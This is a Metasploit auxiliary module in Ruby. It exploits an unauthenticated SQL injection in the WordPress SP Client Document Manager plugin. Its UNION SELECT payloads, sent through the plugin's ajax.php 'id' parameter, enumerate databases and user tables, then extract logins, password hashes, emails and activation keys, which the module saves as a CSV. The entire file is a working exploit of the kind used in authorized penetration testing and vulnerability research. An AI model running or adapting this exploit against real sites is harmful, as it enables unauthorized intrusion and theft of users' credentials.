##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress SP Document Manager Unauthenticated User/Hashes Enumeration via SQLi',
      'Description'    => %q{
      This module exploits an unauthenticated SQL injection in order to pull out the users and their password
      hashes from the wordpress database.
      },
      'References'     =>
        [
          ['URL', 'http://1337day.com/exploit/22911']
        ],
      'Author'         =>
        [
          'bperry',
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => "Nov 22 2014"
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to Wordpress', '/']),
      ], self.class)
  end

  def run

    left_marker = Rex::Text.rand_text_alpha(8)
    right_marker = Rex::Text.rand_text_alpha(8)

    url = normalize_uri(target_uri.path, 'wp-content', 'plugins', 'sp-client-document-manager', 'ajax.php')
    get_dbs = " UNION ALL SELECT NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(schema_name AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.SCHEMATA#"

    res = send_request_cgi({
      'uri' => url,
      'vars_get' => {
        'function' => 'download-project',
        'id' => '1 ' + get_dbs
      }
    })

    zip_url = normalize_uri(target_uri.path, 'wp-content', 'uploads', 'sp-client-document-manager', '.zip')

    res = send_request_cgi({
      'uri' => zip_url
    })

    dbs = []
    res.body.scan(/#{left_marker}(.*)#{right_marker}/) do |match|
      dbs << match[0]
    end

    dbs.uniq!

    dbs.delete('information_schema')
    dbs.delete('performance_schema')
    dbs.delete('mysql')

    users = {}
    dbs.each do |db|

      print_status("Found database: " + db)
      get_tables = " UNION ALL SELECT NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(table_name AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]})#"

      res = send_request_cgi({
        'uri' => url,
        'vars_get' => {
          'function' => 'download-project',
          'id' => '1 ' + get_tables
        }
      })

      res = send_request_cgi({
        'uri' => zip_url
      })

      tables = []
      res.body.scan(/#{left_marker}(.*)#{right_marker}/) do |match|
        tables << match[0] if match[0] =~ /users$/
      end

      tables.uniq!

      tables.each do |table|
        print_status("Found possible user table: " + table)

        cols = ['ID', 'user_url', 'user_pass', 'user_login', 'user_email', 'user_status', 'display_name', 'user_nicename', 'user_activation_key']

        user_markers = []
        user_markers << Rex::Text.rand_text_alpha(8)
        cols.each do
          user_markers << Rex::Text.rand_text_alpha(8)
        end

        user_regex = ''
        0.upto(cols.length-1) do |i|
          user_regex << user_markers[i] + "(.*)"
        end
        user_regex << user_markers[cols.length]

        user_regex = /#{user_regex}/

        get_users = " UNION ALL SELECT NULL,NULL,CONCAT(0x#{user_markers[0].unpack("H*")[0]}"
        0.upto(cols.length-1) do |i|
          get_users << ",IFNULL(CAST(#{cols[i]} AS CHAR), 0x20),0x#{user_markers[i+1].unpack("H*")[0]}"
        end

        get_users << "),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM #{db}.#{table}#"

        res = send_request_cgi({
          'uri' => url,
          'vars_get' => {
            'function' => 'download-project',
            'id' => '1' + get_users
          }
        })

        res = send_request_cgi({
          'uri' => zip_url
        })

        res.body.scan(user_regex).each do |match|
          users[match[0]] = {}
          users[match[0]] = match
        end
      end
    end

    csv = "id,user_url,user_pass,user_login,user_email,user_status,display_name,user_nicename,user_activation_key\n"

    users.each do |k,v|
      csv << v.join(',') + "\n"
    end

    vprint_good(csv)
    path = store_loot('wordpress.users', 'text/plain', datastore['RHOST'], csv)
    print_status ("File saved to #{path}.")
  end
end

